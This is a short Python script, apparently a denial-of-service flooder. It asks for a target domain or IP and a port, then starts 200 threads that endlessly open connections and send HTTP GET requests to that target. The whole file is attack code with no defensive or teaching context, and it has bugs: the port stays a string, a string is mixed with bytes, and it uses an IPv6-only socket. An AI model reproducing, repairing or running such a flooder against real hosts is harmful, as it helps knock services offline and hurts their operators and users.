import socket
import threading

target = input("Enter A Domain Name or Ip Address# ")
port   = input("Enter Target Port# ")

attack_connect = 0

def attack():
    while True:
        i = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        i.connect((target, port))
        i.send("GET / HTTP/1.1\r\nHost: " + target.encode())
        i.close()

        global attack_connect
        attack_connect += 1
        if attack_connect % 200 == 0:
            print (attack_connect)

for i in range(200):
    thread = threading.Thread(target=attack)
    thread.start()
